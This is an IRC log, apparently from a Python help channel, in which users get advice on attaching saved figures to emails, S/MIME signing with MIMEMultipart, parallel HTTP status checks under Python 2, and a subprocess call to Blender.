[12:00:25] *** Quits: callMe_Dude (~callMe_Du@117.201.141.223) (Ping timeout: 260 seconds)
[12:00:45] *** Quits: s14ve (~s14ve@80.188.193.126) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[12:00:50] <psychuil> https://paste.pound-python.org/show/u7iXtxpXLgcO8D3AXi2L/
[12:00:54] <psychuil> Here's the code
[12:01:13] <psychuil> I've defined attachments as an array earlier up
[12:01:59] <psychuil> This is more of a jeneral question on how to sahre files created in a fucntion with outside functions or users
[12:02:04] <psychuil> general
[12:02:10] *** Joins: tuxiano (~tuxiano@2a02:8070:89d4:aa00:61a6:6e95:fb56:da5e)
[12:02:15] *** Joins: s14ve (~s14ve@80.188.193.126)
[12:02:17] *** Parts: jmercouris (~jmercouri@x4db3dca6.dyn.telefonica.de) ("Exit.")
[12:02:27] *** Joins: stitched_unicorn (~textual@fs276ed214.tkyc201.ap.nuro.jp)
[12:02:45] *** Quits: brainproxy (~michael@pdpc/supporter/gold/brainproxy) (Ping timeout: 264 seconds)
[12:03:05] <ytrezq> Hello, how to handle MIMEMultipart with encryption/signing since only content is signed ? https://stackoverflow.com/q/51051263/2284570
[12:03:50] *** Joins: kepler- (~kepler@unaffiliated/kepler)
[12:04:24] *** Joins: whaley (uid13429@gateway/web/irccloud.com/x-jrtresjjydhxdlky)
[12:04:39] *** Joins: Sepultura (~Sepultura@unaffiliated/sepultura)
[12:05:07] *** Joins: floppydh (floppydh@gateway/vpn/privateinternetaccess/floppydh)
[12:05:37] *** Joins: manuelschneid3r (~manuelsch@p57A39159.dip0.t-ipconnect.de)
[12:05:43] <ikanobori> ytrezq: I don't see anything related to s/mime in your code?
[12:05:53] *** Joins: Farad41 (~Thunderbi@cpe-67-249-147-94.twcny.res.rr.com)
[12:06:21] *** Quits: AnySomebody (~AnySomebo@192.129.2.104) (Ping timeout: 264 seconds)
[12:06:23] *** Joins: LambaInsaan (~lambainsa@115.249.71.2)
[12:06:27] <han-solo> psychuil: self.attachments = []; somewhere in __init__, and do the ''.join(self.attachemnets) while sending the mail
[12:07:01] *** Quits: SopaXorzTaker (~SopaXorzT@unaffiliated/sopaxorztaker) (Remote host closed the connection)
[12:07:14] <han-solo> oh
[12:07:42] *** Quits: absolutejam (~absolutej@87-102-46-137.static.kc.net.uk) (Quit: WeeChat 2.1)
[12:07:58] *** Joins: SopaXorzTaker (~SopaXorzT@unaffiliated/sopaxorztaker)
[12:08:22] *** Quits: kepler- (~kepler@unaffiliated/kepler) (Client Quit)
[12:09:02] *** Joins: kepler- (~kepler@unaffiliated/kepler)
[12:09:58] *** Joins: amz31 (~amz3@fsfe/amz3)
[12:10:51] *** Quits: mjolnird (~mjolnird@2601:2c7:8200:5a1::3b40) (Remote host closed the connection)
[12:10:54] *** Quits: s14ve (~s14ve@80.188.193.126) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[12:11:10] *** Joins: Miezel (~Miezel@65-120-11-130.dia.static.qwest.net)
[12:11:17] <psychuil> han-sol, i don't get what the .join is supposed to do
[12:11:18] *** Joins: mjolnird (~mjolnird@2601:2c7:8200:5a1::3b40)
[12:11:25] <shmoon> cdunklau: Still there?
[12:11:29] *** Joins: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com)
[12:11:52] *** Quits: kepler- (~kepler@unaffiliated/kepler) (Client Quit)
[12:12:07] <han-solo> pyporla: ignore what i said
[12:12:15] *** Joins: bablux (~bablux@gateway/tor-sasl/cyril1)
[12:12:25] <han-solo> join just joins the list
[12:12:54] <psychuil> O'
[12:13:03] <psychuil> I'm not sure what that means >_>
[12:13:09] <han-solo> x = ['s', 'a', 'r']; '+'.join(x) becomes 's+a+r'
[12:13:19] <han-solo> that is not the problem you are facing anywway
[12:13:30] *** Joins: antgel (~topdog@141.226.120.30)
[12:13:32] <psychuil> yeah, but if those are files, what would it join them into?
[12:13:34] *** Joins: dfee4 (~dfee@cpe-70-95-143-62.san.res.rr.com)
[12:13:47] *** Quits: minimal_life (~cfurlin-x@2601:603:1500:1e9a::8436) (Quit: Konversation terminated!)
[12:13:52] *** Quits: uttam (~uttam@vpn.bose.res.in) (Quit: uttam)
[12:14:01] *** Quits: Avinash (~Avinash@unaffiliated/avinash) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[12:14:33] *** Quits: mavrix (~mavrix@unaffiliated/mavrix) (Ping timeout: 265 seconds)
[12:14:42] <han-solo> psychuil: a big string of path with spaces
[12:14:52] *** Quits: basen_ (~basen_@62.178.248.26) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[12:15:02] <psychuil> Why not just past a list of paths?
[12:15:08] <psychuil> IS there a difference?
[12:15:25] <hid3> I have around 1600 directories which I need to process with my python script. Since processing one dir takes a long time, I think I need to do some parallelism. The system has got resources to run 7-8 such threads in parallel. The question would be how do I efficiently split the directories based on first letter and parelize all of that? I tried sorting it then reverse sorting but that's only 2 threads.... Need more but at the same time I need the threads not
[12:15:27] <han-solo> self.alert.send may take attachments as a string ?
[12:15:53] *** Quits: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com) (Ping timeout: 255 seconds)
[12:16:02] <han-solo> can you paste what game['topic_name'] is ?
[12:16:12] <han-solo> and os.path.abspath(__file__)
[12:16:15] *** Joins: kepler- (~kepler@unaffiliated/kepler)
[12:16:27] <psychuil> It's a series of names i use to query the database
[12:16:30] *** Joins: basen_ (~basen_@62.178.248.26)
[12:16:41] <ytrezq> ikanobori: Yes, I know how to use s/mime encryption and signing alone. The problem is when I build a mimemultipart object, message body and metadata are mixed (https://stackoverflow.com/q/51051263/2284570)
[12:17:10] <psychuil> If you want me to paste it, i need to wait for the script to finish this run before i can breakpoint :)
[12:17:16] <ikanobori> ytrezq: Show us how you're doing your S/MIME.
[12:17:21] *** Joins: rtyupoi (~rtyupoi@78-11-218-76.static.ip.netia.com.pl)
[12:17:35] <fredrikhl> hid3: Maybe gather all directory names that you need to process first, then stick them on a Queue
[12:17:40] <ikanobori> Because the link you're posting isn't doing S/MIME it's just creating an email with an attachment and sending it.
[12:17:55] *** Joins: JackLau (~JackLau@103.106.98.28)
[12:18:08] *** Quits: dfee4 (~dfee@cpe-70-95-143-62.san.res.rr.com) (Ping timeout: 255 seconds)
[12:18:09] *** Quits: JackLau (~JackLau@103.106.98.28) (Client Quit)
[12:18:11] <ytrezq> ikanobori I mean when I use msg.as_string() m contains both message body and sender/recepient.
[12:18:30] *** Joins: JackLau (~JackLau@103.106.98.28)
[12:18:32] <fredrikhl> hid3: and you'd probably want to use multiprocessing, not threads
[12:18:39] <han-solo> psychuil: No, i think, path = os.path.abspath(__file__) at the top, and do attachements += fig.savefig(os.path.join(path, '{0}'.format(game)))
[12:18:41] *** Joins: Kundry_Wag (~Kundry_Wa@177.18.249.170)
[12:18:44] *** Quits: basen_ (~basen_@62.178.248.26) (Client Quit)
[12:18:53] *** Joins: FrankyCyborg (~FrankyCyb@p54849E4B.dip0.t-ipconnect.de)
[12:19:08] *** Quits: rsrx (~rsrx@cable-94-189-224-42.dynamic.sbb.rs) (Read error: Connection reset by peer)
[12:19:13] <psychuil> aight, i'll try that if the self.attachments won't work
[12:19:17] <psychuil> didn't work
[12:19:24] *** Quits: kepler- (~kepler@unaffiliated/kepler) (Client Quit)
[12:19:30] <han-solo> no, no. self.attachment is not reqtired
[12:19:33] <psychuil> path = os.path.abspath(__file__) at the top or the init?
[12:19:40] <psychuil> and what's __ for?
[12:19:45] *** Joins: kurkale61 (~kurkale6k@84.45.99.125)
[12:19:45] <han-solo> if in init, self.path
[12:20:05] <ytrezq> ikanobori: That’s how I’m doing �/ᴍɪᴍᴇ https://tools.ietf.org/doc/python-m2crypto/howto.smime.html
[12:20:20] <ytrezq> or whereas how I’m supposed to do it.
[12:20:21] <psychuil> ok, what's __file__?
[12:20:34] <ytrezq> you just m.as_string
[12:20:48] <han-solo> that will give you the path runing the script, __file__ being your file name
[12:21:01] <ytrezq> but in that case I cannot build RFC header manually.
[12:21:16] <ytrezq> I need to use the mimemultipart module instead
[12:21:22] *** Joins: kepler- (~kepler@unaffiliated/kepler)
[12:21:56] <psychuil> You mean '__file__' is automatically converted to be my file name?
[12:21:59] <ytrezq> ikanobori but it still end up using msg.as_string
[12:21:59] *** Joins: lorddaed_ (~lorddaedr@185.44.76.121)
[12:22:06] *** Joins: humitos (~humitos@152.169.140.157)
[12:22:10] *** Quits: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8) (Ping timeout: 260 seconds)
[12:22:11] <han-solo> psychuil: does the files gets saved in the same path, where the script is running ?
[12:22:20] <ytrezq> so https://tools.ietf.org/doc/python-m2crypto/howto.smime.html only works for plain attachment
[12:22:28] <han-solo> If not, then that could be the reason
[12:22:38] <ikanobori> ytrezq: Do you understand how S/MIME works?
[12:23:05] <psychuil> han-solo, i honestly have no idea
[12:23:20] *** Joins: Avinash (~Avinash@unaffiliated/avinash)
[12:23:40] <ytrezq> ikanobori: Yes, I do understand that sender and subject should not be signed, but that message attachment metadata and text still requires to be signed
[12:23:40] <psychuil> I'm running it from a file called initProcess.py and i've set it up as a class
[12:23:41] *** Quits: kajo (~kajo@2001:4c50:371d:8400:ca2a:14ff:fe0f:7dd1) (Ping timeout: 276 seconds)
[12:23:41] *** Joins: Wr4i7h (~abcd@a85-139-11-90.cpe.netcabo.pt)
[12:23:43] *** Quits: seen_ (~seen_@gateway/tor-sasl/seen/x-50706747) (Ping timeout: 250 seconds)
[12:24:02] <han-solo> wait, you have permission denied error
[12:24:18] <psychuil> IOError: [Errno 20] Not a directory: '/home/anton/Documents/Projects/Data-Platform/QA-Automation/QA-Automation-Script/python/transaction_report/initProcess.py/Alliance.png'
[12:24:25] <ytrezq> ikanobori os the problem is not with m2crypto, but with the python builtin mime module
[12:24:25] <psychuil> Yeah
[12:24:26] *** Quits: lastmanstanding (~arjoonn@202.191.67.138) (Ping timeout: 255 seconds)
[12:25:30] *** Quits: lorddaedra (~lorddaedr@78.157.211.238) (Ping timeout: 260 seconds)
[12:25:51] *** Joins: seen_ (~seen_@gateway/tor-sasl/seen/x-50706747)
[12:26:06] *** Joins: rsrx (~rsrx@cable-94-189-226-199.dynamic.sbb.rs)
[12:26:08] <ikanobori> ytrezq: Ok well, does S/MIME sign per MIMEPart or does it sign the entire message at once?
[12:26:12] <ikanobori> Because that'll be relevant.
[12:26:16] *** Joins: lastmanstanding (~arjoonn@137.97.106.0)
[12:26:30] *** Quits: greg_f (~greg@altlinux/developer/greg) (Ping timeout: 245 seconds)
[12:26:36] *** Joins: andylavarre (~andy@mobile-166-177-57-15.mycingular.net)
[12:26:42] <ytrezq> ikanobori: the entire message body at once without metadata
[12:26:57] *** Quits: fikka (~fikka@31.223.233.9) (Ping timeout: 240 seconds)
[12:27:15] <ikanobori> And by metadata you mean the email headers or also the boundaries?
[12:27:45] <han-solo> psychuil: I'm not sure, how to figure this out without even a little traceback, because i don't even know what, self.alert.send is
[12:28:04] *** Joins: sparrowsword (49be6e08@gateway/web/freenode/ip.73.190.110.8)
[12:28:20] <sparrowsword> is there a way to load profiles with selenium using the IE driver?
[12:28:27] <cdunklau> shmoon: yep
[12:28:44] *** Joins: luizdepra (~luizdepra@2001:1284:f01c:66dd:4f9:4455:590a:6882)
[12:28:57] *** Joins: theseb (~user@47-220-211-42.cnrocmta03.res.dyn.suddenlink.net)
[12:28:59] <ytrezq> ikanobori only headers are excluded
[12:29:12] *** Joins: mavrix (~mavrix@unaffiliated/mavrix)
[12:29:43] *** Joins: sqram (~resio@67.149.152.190)
[12:30:15] *** Joins: lumm (~lumm@16.42.136.77.rev.sfr.net)
[12:30:19] <ikanobori> ytrezq: In that case as_string or as_bytes and splitting on \r\n\r\n will suffice.
[12:30:28] *** Quits: mjolnird (~mjolnird@2601:2c7:8200:5a1::3b40) (Remote host closed the connection)
[12:30:41] <psychuil> han-solo, pmed you
[12:30:59] <han-solo> psychuil: is attachement in self.alert.send, should be a list or string ?
[12:31:04] <han-solo> psychuil: No need to pm me
[12:31:37] *** Joins: mjolnird (~mjolnird@2601:2c7:8200:5a1::3b40)
[12:32:30] <psychuil> It's stuff i'd rather not share publicly, hance the pm
[12:32:49] *** Joins: redrum88 (~Helder@177.180.184.84)
[12:32:52] <psychuil> as far as the file handling, here's what it does inside with the file: https://paste.pound-python.org/show/OkJkKPHk7zMW89rCDydh/
[12:33:00] *** Quits: psachin (~psachin@103.51.234.17) (Ping timeout: 256 seconds)
[12:33:01] <psychuil> files is what i give attachments=
[12:33:02] <han-solo> There is no exclusive information anyway
[12:33:09] *** Joins: greg_f (~greg@altlinux/developer/greg)
[12:33:27] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[12:34:24] *** Joins: backnforth (~backnfort@mctnnbsa45w-156-34-60-65.dhcp-dynamic.fibreop.nb.bellaliant.net)
[12:34:26] *** Joins: brainproxy (~michael@pdpc/supporter/gold/brainproxy)
[12:35:13] *** Joins: jstein_ (~jstein@gentoo/developer/jstein)
[12:35:20] *** Joins: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8)
[12:35:23] <ytrezq> ikanobori: but even using the mime module without specifying headers, boundary main headers (boundary="===============1505858819==") are still included whereas they must not be signed
[12:35:27] *** jstein_ is now known as jstein
[12:35:40] *** Joins: AnySomebody (~AnySomebo@192.129.2.104)
[12:35:46] *** Quits: humitos (~humitos@152.169.140.157) (Remote host closed the connection)
[12:36:07] *** Joins: humitos (~humitos@152.169.140.157)
[12:36:10] <ikanobori> ytrezq: Oh so the b oundaries must be excluded?
[12:36:15] *** Quits: subho (~subho@fedora/subho) (Quit: laptop going to sleep. ZZZzzz…)
[12:36:15] *** Quits: humitos (~humitos@152.169.140.157) (Remote host closed the connection)
[12:36:16] *** Joins: root3d (~root3d@unaffiliated/root3d)
[12:36:18] <ikanobori> Because you just said only the headers should be excluded.
[12:36:21] *** Quits: amz31 (~amz3@fsfe/amz3) (Ping timeout: 264 seconds)
[12:36:57] *** Joins: humitos (~humitos@152.169.140.157)
[12:37:00] *** Joins: adamholmberg (~adamholmb@69.80.114.120)
[12:37:17] <ytrezq> MIMEMultipart('alternative').as_string() returns
[12:37:25] <ytrezq> 'Content-Type: multipart/alternative; boundary="===============0278879731=="\nMIME-Version: 1.0\n\n--===============0278879731==\n\n--===============0278879731==--\n'
[12:37:31] <ikanobori> ...
[12:37:37] <ikanobori> Do it on the message, not on a single mimepart.
[12:37:38] *** Quits: pepijndevos (524b7326@gateway/web/freenode/ip.82.75.115.38) (Quit: Page closed)
[12:37:39] <ytrezq> a part which should not be signed
[12:37:39] *** Joins: GenteelBen (GenteelBen@cpc129112-lutn14-2-0-cust66.know.cable.virginm.net)
[12:37:43] <ikanobori> Exactly as you are doing in your stackoverflow question.
[12:37:48] <ikanobori> Where the comment is 'the problem is here'.
[12:38:18] <ikanobori> What are the contents of that as_string, it should be the entire message. If you partition that on CRLF*2 and take the rest then you have the entire message excluding its headers.
[12:38:19] *** Quits: lorddaed_ (~lorddaedr@185.44.76.121) (Read error: Connection timed out)
[12:38:40] *** Joins: cerealguy (uid86634@gateway/web/irccloud.com/x-gnplxzufciqxtcwx)
[12:39:02] <ikanobori> Let me see if I can whip up an example.
[12:39:31] <ytrezq> ikanobori: you do not understand, MIMEMultipart('alternative').as_string() returns an empty message which still contains content-type header and MIME-Version: 1.0. Those header must not be signed
[12:39:56] <ytrezq> as well as boundaries between them
[12:40:12] *** Joins: lorddaedra (~lorddaedr@185.44.76.121)
[12:41:06] *** Joins: mydog2 (~mydog2@adsl-184-45-18-43.sdf.bellsouth.net)
[12:41:14] *** Quits: humitos (~humitos@152.169.140.157) (Remote host closed the connection)
[12:41:16] *** Joins: Technodrome (~textual@unaffiliated/technodrome)
[12:41:16] <ytrezq> so even if I don’t include subjects and e‑mail addresses in my email, those headers would still be signed since they are created by default
[12:41:28] *** Joins: sdwrage (~textual@64.247.67.53)
[12:41:56] *** Joins: humitos (~humitos@152.169.140.157)
[12:41:57] *** Quits: adamholmberg (~adamholmb@69.80.114.120) (Ping timeout: 256 seconds)
[12:42:17] *** Joins: finkata (~finkata@gateway/tor-sasl/finkata)
[12:42:18] <BlueShark> Hi guys.
[12:42:45] <BlueShark> If I have 5 URLs, and I want to check if all of them return the same HTTP status code, what's the best way to do it?
[12:43:27] <cdunklau> BlueShark: iterate over them, requests.get ?
[12:44:08] <BlueShark> I am using requests library. My thought was to use 'from multiprocessing.dummy import Pool' and then pool = Pool(5); result = pool.map(checker_func, list_of_urls); pool.close(); pool.join(); if all status codes in list are same: return true
[12:44:23] *** Joins: dimitrovskif (~dimitrovs@89.205.68.164)
[12:44:33] <BlueShark> cdunklau Is there a better approach? I need it to be threaded - as in the fastest way possible
[12:44:40] <han-solo> if all(status == wanted_stat for status in response_list)
[12:44:52] <cdunklau> BlueShark: async?
[12:45:37] <BlueShark> han-solo I don't know the wanted_stat, I just want to check if they're all the same. How about len(set(response_list)) == 1?
[12:45:43] *** Quits: cryptoflop (~cryptoflo@194.126.137.60) (Ping timeout: 256 seconds)
[12:45:57] <BlueShark> cdunklau async?
[12:46:20] *** Joins: akar (~user@139.0.79.67)
[12:46:35] <BlueShark> aiohttp - is that what you're talking about?
[12:46:36] <han-solo> Ah
[12:47:38] *** Quits: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8) (Ping timeout: 276 seconds)
[12:48:17] *** Joins: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au)
[12:48:21] <Yhg1s> BlueShark: that would be decidedly better than multiprocessing, yes.
[12:48:33] <ikanobori> ytrezq: Ah, then use get_payload on the part to extract only its content?
[12:48:40] <ikanobori> ytrezq: https://bpaste.net/show/fca5aa74b9f6 like so
[12:49:00] *** Joins: ferdna (~ferdna@68-73-71-246.lightspeed.elpstx.sbcglobal.net)
[12:49:03] <cdunklau> BlueShark: or twisted, but sure
[12:49:06] <BlueShark> Yhg1s Any specific libraries or links that you could point me to? There seems to be a lot of libraries around for this purpose
[12:49:20] <cdunklau> BlueShark: aiohttp is a nice lib
[12:49:28] <ytrezq> ikanobori and the payload is necessarly a string ?
[12:49:29] <cdunklau> BlueShark: for twisted, treq is pretty nice
[12:49:46] *** Joins: corretico (~corretico@186.4.59.151)
[12:50:47] <gthank> BlueShark You can just use requests and plain old asyncio, too
[12:50:56] <ikanobori> ytrezq: On the entire mesasge it's either a list (if is_multipart() is True) or a string.
[12:51:04] <ikanobori> https://docs.python.org/3/library/email.compat32-message.html#email.message.Message.get_payload
[12:51:07] <ikanobori> See there.
[12:51:25] <BlueShark> It's just 5 URLs - what do you think would be the best option to go with? Twisted/Tornado etc. is an overkill for something this simple, right? Correct me if I am wrong.
[12:51:42] *** Quits: amirpro (~amirpro@154.238.18.159) (Quit: amirpro)
[12:51:45] *** Quits: dimitrovskif (~dimitrovs@89.205.68.164) (Ping timeout: 260 seconds)
[12:51:57] *** Quits: Kundry_Wag (~Kundry_Wa@177.18.249.170) (Ping timeout: 256 seconds)
[12:52:15] *** Joins: realbadhorse (~realuname@183.87.124.175)
[12:52:20] *** Quits: Avinash (~Avinash@unaffiliated/avinash) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[12:52:24] *** Joins: ncrocfer (~ncrocfer@unaffiliated/ncrocfer)
[12:52:37] *** Joins: dramsey_ (~dramsey@c-68-37-94-119.hsd1.mi.comcast.net)
[12:52:58] *** Joins: Arcaelyx (~Arcaelyx@2604:2000:f14a:2500:44b7:d903:69b3:3e53)
[12:53:22] *** Parts: ncrocfer (~ncrocfer@unaffiliated/ncrocfer) ()
[12:53:31] *** Joins: dimitrovskif (~dimitrovs@89.205.68.164)
[12:53:42] *** Quits: tom__ (~tom@p54B0E142.dip0.t-ipconnect.de) (Ping timeout: 265 seconds)
[12:53:45] <han-solo> asyncio + aiohttp is fine and it will scale , if you are plannig to
[12:53:54] <gthank> BlueShark For just 5 urls, you should put them in a list and loop across it threaded style
[12:53:57] *** Quits: palasso (~palasso@unaffiliated/palasso) (Ping timeout: 245 seconds)
[12:54:07] *** Joins: floryst__ (~floryst@cpe-24-163-58-187.nc.res.rr.com)
[12:54:14] <gthank> BlueShark But assuming you want to do async, then I'd just use plain requests and plain asyncio.
[12:54:20] *** Joins: defarge (~quassel@96.36.198.190)
[12:54:32] *** Quits: alexmitchell (~alexmitch@118.211.33.127) (Quit: alexmitchell)
[12:54:35] *** Joins: amirpro (~amirpro@154.238.18.159)
[12:54:36] *** Joins: palasso (~palasso@unaffiliated/palasso)
[12:54:40] *** Joins: xliiv_ (~xliiv@d89-122.icpnet.pl)
[12:54:50] <gthank> BlueShark Here's the core of a hacky script I threw together a couple of years ago to grab offline copies of some tutorials https://gist.github.com/gthank/36aad82b6a7527222f4616c4d8e6d00d
[12:54:55] *** Quits: [itchyjunk] (~itchyjunk@unaffiliated/itchyjunk/x-1640057) (Remote host closed the connection)
[12:55:24] *** Joins: fikka (~fikka@254C2DB4.nat.pool.telekom.hu)
[12:55:32] <gthank> You can just ignore all the scraperish bits and focus on the rest
[12:55:48] *** Quits: fr0ddy (~fr0ddy@49.248.66.98) (Ping timeout: 256 seconds)
[12:55:49] *** Quits: Sxuza (~textual@41.13.176.25) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[12:55:49] <BlueShark> gthank Okay, cool. But is requests library async?
[12:55:56] <gthank> It doesn't have to be
[12:55:59] *** Quits: LambaInsaan (~lambainsa@115.249.71.2) (Read error: Connection reset by peer)
[12:56:03] <BlueShark> Why?
[12:56:22] <gthank> Because you can just write your own method that wraps the actual request and make that async
[12:56:22] <Yhg1s> BlueShark: gthank is calling requests in different threads. Using aiohttp would probably be easier.
[12:56:31] *** Quits: amirpro (~amirpro@154.238.18.159) (Client Quit)
[12:56:33] <gthank> That's what makes asyncio so nifty
[12:56:54] *** Joins: amirpro (~amirpro@41.234.193.158)
[12:57:24] *** Quits: rafael_p (uid72318@gateway/web/irccloud.com/x-gkntgkszuijqfwwa) (Quit: Connection closed for inactivity)
[12:57:30] *** Quits: xliiv (~xliiv@d89-122.icpnet.pl) (Ping timeout: 256 seconds)
[12:58:10] *** Quits: mreznik (mreznik@nat/redhat/x-xxfjkjflgvgltcwh) (Ping timeout: 260 seconds)
[12:58:15] *** Joins: sol1x (~sol1x@2a02:810d:4ac0:546a:226d:6d32:8be3:9c2a)
[12:59:03] <BlueShark> All the examples that I saw using aiohttp/asyncio are using Python 3.5. I am stuck with 2.x for now :(
[12:59:06] *** Joins: o_lalertom (~o_lalerto@moonstonemedical/developer/o-lalertom)
[12:59:25] *** Joins: Pronoe (~Pronoe@D96837C6.cm-24.dynamic.ziggo.nl)
[12:59:32] <gthank> BlueShark Well in that case, asyncio and friends are out
[12:59:36] <Yhg1s> BlueShark: then you can't use asyncio at all, no.
[12:59:47] *** Quits: AnySomebody (~AnySomebo@192.129.2.104) (Ping timeout: 245 seconds)
[12:59:48] <BlueShark> Oh. So it boils down to... what?
[12:59:51] <Yhg1s> BlueShark: twisted/treq (or tornado, or various other options) are available though.
[12:59:58] <gthank> BlueShark 1) You should really use a modern Python 2) look at twisted or maybe one of the gevent integrations for requests
[13:00:03] <Yhg1s> BlueShark: you can also just fetch them in serial, or use threads.
[13:00:05] *** Joins: Draecos (~Draecos@203.121.220.138)
[13:00:07] *** Quits: Technodrome (~textual@unaffiliated/technodrome) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[13:00:27] <BlueShark> So back to multiprocessing.dummy.Pool I guess.
[13:00:37] *** Quits: lastmanstanding (~arjoonn@137.97.106.0) (Ping timeout: 245 seconds)
[13:00:39] *** Quits: corretico (~corretico@186.4.59.151) (Ping timeout: 256 seconds)
[13:00:40] *** Joins: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8)
[13:00:55] *** Joins: Sxuza (~textual@41.13.176.25)
[13:00:58] <BlueShark> gthank I would love to, but just isn't possible atm - not something I have control over.
[13:01:00] *** Quits: therue (~therue@1-162-68-203.dynamic-ip.hinet.net) (Quit: WeeChat 2.1)
[13:01:12] *** Joins: therue (~therue@1-162-68-203.dynamic-ip.hinet.net)
[13:01:29] *** Joins: adamholmberg (~adamholmb@69.80.114.120)
[13:01:52] *** Quits: root3d (~root3d@unaffiliated/root3d) ()
[13:03:35] *** Quits: Syzygy (~Syzygy@2001:850:40bc:8000:94c8:3232:f35e:1ba8) (Ping timeout: 245 seconds)
[13:03:50] <rodskagg> https://pastebin.com/Fn33UQvc < having a problem with subprocess.
[13:03:51] <infobob> https://paste.pound-python.org/show/ap370CXazpbAuUw4j5Ud/ (repasted for rodskagg)
[13:04:09] *** Quits: Sxuza (~textual@41.13.176.25) (Client Quit)
[13:04:12] <rodskagg> the arguments i give are correct, but it ignores the second part.
[13:04:25] *** Joins: aielima_ (~aielima@gateway/tor-sasl/aielima)
[13:04:26] <rodskagg> if i print out the statement, copy and paste and run, it works fine.
[13:04:27] *** Quits: backnforth (~backnfort@mctnnbsa45w-156-34-60-65.dhcp-dynamic.fibreop.nb.bellaliant.net) (Ping timeout: 240 seconds)
[13:04:30] <rodskagg> doesn't make sense.
[13:04:33] *** Quits: aielima (~aielima@gateway/tor-sasl/aielima) (Remote host closed the connection)
[13:04:49] *** Quits: dimitrovskif (~dimitrovs@89.205.68.164) (Ping timeout: 265 seconds)
[13:05:25] *** Joins: jcalla (jcallaha@nat/redhat/x-wzzkdzoxglbvucbx)
[13:05:36] <gthank> BlueShark https://github.com/kennethreitz/grequests
[13:05:57] *** Quits: Mayurvpatil (~mayurvpat@123.201.35.174) (Remote host closed the connection)
[13:06:17] <ytrezq> ikanobori: that doesn’t work.
[13:06:44] <ytrezq> ikanobori: I need a string with Multipart
[13:06:55] <odinsbane> rodskagg: how do you get any output from your supbrocess?
[13:07:18] <cdunklau> odinsbane: child processes inherit the parent's file descriptors
[13:07:22] <cdunklau> (by default)
[13:07:55] *** Quits: tsglove (~tsglove@12.205.72.46) (Quit: Leaving)
[13:08:36] *** Quits: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au) (Remote host closed the connection)
[13:09:02] <rodskagg> odinsbane:     process=subprocess.run([blender,"-P",importFile])
[13:09:02] <rodskagg>     print(process.returncode)
[13:09:06] <rodskagg> returned 0
[13:09:16] <rodskagg> so no errors, i assume.
[13:10:14] *** Joins: GraysonBriggs (~GraysonBr@206-51-126-226.up.net)
[13:10:25] *** Quits: elyezer_ (~elyezer@unaffiliated/elyezer) (Ping timeout: 260 seconds)
[13:10:34] *** Quits: Furai (~Furai@cookiehoster.furai.pl) (Quit: WeeChat 2.1)
[13:10:44] <Yhg1s> rodskagg: there may be something in the environment that affects Blender, or open file descriptors from the parent process. Add 'env={}, close_fds=True' to the subprocess.Popen call.
[13:11:09] <Yhg1s> BlueShark: multiprocessing.dummy is not a thing to use, no.
[13:11:21] *** Joins: fr0ddy (~fr0ddy@49.248.66.98)
[13:12:11] *** Joins: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com)
[13:12:18] <rodskagg> Yhg1s: process=subprocess.run([blender,"-P",importFile], env={}, close_fds=True) ?
[13:12:21] *** Quits: ali1234 (~ali1234@88.97.12.44) (Ping timeout: 264 seconds)
[13:12:42] *** Joins: WhiteDevil (~WhiteDevi@2601:803:c401:ef51:65ec:e11a:e685:efb9)
[13:12:58] <Yhg1s> rodskagg: yes. although I didn't notice you were using subprocess.run, so close_fds would default to True anyway.
[13:13:04] *** Joins: saml (~saml@unaffiliated/saml)
[13:13:08] *** Quits: zefferno (~zefferno@unaffiliated/zefferno) (Quit: Leaving)
[13:13:28] *** Joins: Technodrome (~textual@unaffiliated/technodrome)
[13:13:36] <rodskagg> same result. :(
[13:13:39] <rodskagg> thanks tho.
[13:13:43] <cdunklau> rodskagg: can we see the script
[13:13:53] <ytrezq> ikanobori I need all payloads as a single string
[13:13:57] <cdunklau> maybe it depends on having a real terminal
[13:14:01] *** Joins: Furai (~Furai@cookiehoster.furai.pl)
[13:14:09] <cdunklau> err, well, that shouldn't matter though :/
[13:14:20] <odinsbane> rodskagg: you could also try shell=True, but you have to change the list of cmds to a single string.
[13:14:21] <Yhg1s> cdunklau: rodskagg isn't redirecting stdint/stdout, so it's attached to the same terminal as the Python program.
[13:14:23] <cdunklau> (since it should be able to see the terminal python is running in)
[13:14:25] <cdunklau> right
[13:14:30] <Yhg1s> odinsbane: how would that help?
[13:14:52] <WhiteDevil> why do alot of people use ruby instead of python for web dev ?
[13:15:02] <Yhg1s> WhiteDevil: you'd have to ask those people who use Ruby.
[13:15:23] *** Joins: zefferno (~zefferno@unaffiliated/zefferno)
[13:15:24] <han-solo> Let's talk about Ruby....
[13:15:28] <han-solo> :)
[13:15:33] <rodskagg> cdunklau: https://pastebin.com/PptJ1bxS
[13:15:34] <infobob> https://paste.pound-python.org/show/m6akpFp7powUgrQVBeax/ (repasted for rodskagg)
[13:15:39] <WhiteDevil> python can be used for wed dev tho right ?
[13:15:39] <odinsbane> Yhg1s: It there is an environment that blender is using. It seems like the issue is the way that blender is handling the call.
[13:15:44] <cdunklau> WhiteDevil: why do a lot of people like mayo on their french fries?
[13:15:46] <cdunklau> WhiteDevil: sure
[13:16:10] <WhiteDevil> alright..I am gonna stick with python anyways
[13:16:15] <rodskagg> WhiteDevil: look at flask and django.
[13:16:18] <WhiteDevil> because most people use it for automation of tasks
[13:16:23] <cdunklau> WhiteDevil: nah
[13:16:27] *** Quits: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com) (Ping timeout: 240 seconds)
[13:16:28] <Yhg1s> odinsbane: shell=True would not affect any of that. It executes /bin/sh, it doesn't change anything else about the environment. /bin/sh, when executed that way, doesn't load any of the configuration files that may affect other programs.
